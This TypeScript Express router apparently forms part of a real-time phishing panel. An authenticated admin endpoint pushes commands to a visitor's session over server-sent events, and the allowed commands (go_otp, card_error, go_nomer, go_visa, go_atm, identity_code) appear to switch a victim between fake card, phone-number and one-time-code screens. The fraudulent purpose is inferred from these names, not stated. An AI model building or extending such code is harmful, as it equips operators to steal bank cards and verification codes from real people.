import { Router, type IRouter } from "express";
import { setControl, type ControlAction } from "../lib/control-store";
import { extractToken, validateToken } from "../lib/auth";
import { sendSSEMessage, hasConnectedClients } from "../lib/sse-store";

const router: IRouter = Router();

function requireAuth(
  req: import("express").Request,
  res: import("express").Response,
  next: import("express").NextFunction,
): void {
  const token = extractToken(req.headers.authorization);
  if (!token || !validateToken(token)) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

// Legacy endpoint - kept for backwards compatibility
router.get("/control/:sessionId", (_req, res): void => {
  // SSE is now the primary method - this returns null for legacy clients
  res.json({ action: null, message: "Use SSE endpoint instead" });
});

// Legacy endpoint - kept for backwards compatibility  
router.delete("/control/:sessionId", (_req, res): void => {
  res.json({ success: true, action: null, message: "Use SSE endpoint instead" });
});

// Admin sends a control command - broadcasts via SSE immediately
router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
  try {
    const rawSessionId = req.params.sessionId;
    const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
    const { action, code } = req.body as { action?: string; code?: string };

    const allowed: ControlAction[] = [
      "go_otp", "go_otp2", "go_otp3", "card_error",
      "go_nomer", "nomer_error", "go_nomer_wait", "go_nomer_otp",
      "go_home", "go_form", "go_select", "go_visa", "go_atm",
      "go_total", "go_total2", "go_waiting",
      "identity_code", "go_identity_check"
    ];
    
    if (!action || !allowed.includes(action as ControlAction)) {
      res.status(400).json({ error: "Invalid action" });
      return;
    }

    // Also save to control store for legacy support
    setControl(sessionId, action as ControlAction, code);

    // Send via SSE for immediate delivery
    const hasClients = hasConnectedClients(sessionId);
    
    if (hasClients) {
      // Broadcast via SSE - client will receive immediately
      sendSSEMessage(sessionId, "control", {
        action,
        code,
        timestamp: Date.now()
      });
      console.log(`[Control] SSE broadcast sent to session: ${sessionId}`);
    } else {
      console.log(`[Control] No SSE clients connected for session: ${sessionId}, saved to store`);
    }

    res.json({ 
      success: true, 
      sessionId, 
      action, 
      code,
      delivered: hasClients ? "sse" : "store"
    });
  } catch (error) {
    console.error("[Control] Error processing control command:", error);
    res.status(500).json({ error: "Failed to process control command", details: String(error) });
  }
});

export default router;
